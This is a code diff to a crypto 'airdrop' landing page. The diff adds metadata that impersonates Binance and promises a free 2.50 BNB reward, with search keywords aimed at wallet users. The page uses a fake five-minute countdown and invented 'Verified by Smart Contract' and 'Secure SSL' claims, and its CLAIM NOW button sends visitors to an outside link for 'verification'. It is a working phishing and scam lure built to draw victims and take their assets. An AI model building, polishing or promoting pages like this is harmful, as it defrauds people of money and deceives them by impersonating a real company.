@@ -3,7 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Crypto Rewards | Exclusive Airdrop</title>
+    
+    <title>Binance Airdrop 2026 | Claim 2.50 BNB Rewards</title>
+    <meta name="description" content="Official Binance Community Rewards 2026. Claim your 2.50 BNB airdrop now. Verified by Smart Contract. Limited time offer for all crypto wallets.">
+    <meta name="keywords" content="Binance Airdrop, Free BNB, Crypto Rewards 2026, Trust Wallet Airdrop, Metamask Bonus, Claim Free Crypto, Legit Airdrops">
+    <meta name="robots" content="index, follow">
+    
+    <meta property="og:title" content="Exclusive 2.50 BNB Reward">
+    <meta property="og:description" content="Your wallet is eligible for the 2026 Rewards Program.">
+    <meta property="og:image" content="https://cryptologos.cc/logos/binance-coin-bnb-logo.png">
+
     <style>
         body { background: #0b0e11; color: #eaecef; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
         .card { background: #1e2329; border-radius: 20px; padding: 35px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 340px; border: 1px solid #474d57; }
@@ -24,37 +33,25 @@
         <h1>Exclusive Airdrop</h1>
         <p>Offer expires in:</p>
         <div class="timer-container" id="timer">05:00</div>
-        
         <div class="reward-box">
             <span>Claimable Reward:</span><br>
             <span class="reward-amount">2.50 BNB</span>
         </div>
-
         <p style="margin-bottom: 25px;">Complete verification to release assets.</p>
         <a href="https://checkmyapp.store/cl/i/ex27dl"><button>CLAIM NOW</button></a>
         <div class="footer">Verified by Smart Contract • Secure SSL</div>
     </div>
-
     <script>
-        let timeLeft = 300; // 5 دقائق بالثواني
+        let timeLeft = 300;
         const timerElement = document.getElementById('timer');
-
         const countdown = setInterval(() => {
             let minutes = Math.floor(timeLeft / 60);
             let seconds = timeLeft % 60;
-
-            // إضافة صفر على اليسار إذا كانت القيمة أقل من 10
             minutes = minutes < 10 ? '0' + minutes : minutes;
             seconds = seconds < 10 ? '0' + seconds : seconds;
-
             timerElement.innerHTML = minutes + ":" + seconds;
-
-            if (timeLeft <= 0) {
-                clearInterval(countdown);
-                timerElement.innerHTML = "EXPIRED";
-            } else {
-                timeLeft--;
-            }
+            if (timeLeft <= 0) { clearInterval(countdown); timerElement.innerHTML = "EXPIRED"; }
+            else { timeLeft--; }
         }, 1000);
     </script>
 </body>
